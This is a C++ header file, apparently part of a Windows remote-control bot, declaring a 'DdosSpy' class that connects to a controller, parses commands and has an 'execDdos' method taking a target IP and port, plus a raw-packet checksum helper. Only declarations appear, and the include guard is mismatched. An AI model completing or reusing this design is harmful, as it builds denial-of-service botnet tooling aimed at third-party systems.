/*
 *
 *  Author: sumkee911@gmail.com
 *  Date: 25-12-2016
 *  Brief: 实现Cmd命令控制
 *
 */

#ifndef DDOSSPY_H
#define DDOSPY_H

#include "tcpsocket.h"
#include "stdlib.h"
#include "time.h"
#include <windows.h>
#include <vector>
#include <iostream>
#include <map>
#include <winsock2.h>
#include <Ws2tcpip.h>

class DdosSpy
{
public:
    DdosSpy();
    ~DdosSpy();

    // 分割符和结束符号
    const std::string DdosSplit = ";";
    const std::string DdosEnd = "\r\n";

    // 这个类的入口函数
    static USHORT checksum(USHORT *buffer, int size);
    static void startByNewThread(std::string domain, int port);
    static DWORD WINAPI threadProc(LPVOID args);
    static void startDdosSpy(std::string domain, int port);
    static void addDataToBuffer(TcpSocket *sock, std::string &buf, char *data, int size);
    std::map<std::string, std::string> parseArgs(std::string &data);


    // 执行ddos指令
    static void execDdos(std::string atkip, int atkport);
};

#endif // DDOSPY_H
